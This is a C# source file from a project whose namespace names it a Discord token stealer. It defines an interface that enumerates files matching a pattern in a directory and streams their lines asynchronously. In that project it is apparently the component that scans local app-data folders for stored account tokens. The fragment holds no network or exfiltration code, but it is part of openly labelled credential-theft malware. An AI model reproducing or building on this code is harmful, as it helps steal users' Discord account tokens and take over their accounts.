using System.Runtime.CompilerServices;
using System.Text;

namespace DiscordTokenStealer.DirectorySearchProviders;

public interface IDirectorySearchProvider
{
    public string Directory { get; }
    public string Pattern { get; }
    public bool Exists => System.IO.Directory.Exists(Directory);

    private static StreamReader AsyncStreamReader(string path)
    {
        var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, 4096,
            FileOptions.Asynchronous | FileOptions.SequentialScan);
        return new StreamReader(stream, Encoding.UTF8, true);
    }

    public async IAsyncEnumerable<string> EnumerateContentsAsync(
        [EnumeratorCancellation] CancellationToken cancellationToken = default)
    {
        foreach (var file in System.IO.Directory.EnumerateFiles(Directory, Pattern))
        {
            StreamReader? reader = null;
            try
            {
                try
                {
                    reader = AsyncStreamReader(file);
                }
                catch (IOException)
                {
                    continue;
                }

                string? line;
                while ((line = await reader.ReadLineAsync()) != null)
                {
                    yield return line;
                    cancellationToken.ThrowIfCancellationRequested();
                }
            }
            finally
            {
                reader?.DiscardBufferedData();
                reader?.Dispose();
            }
        }
    }
}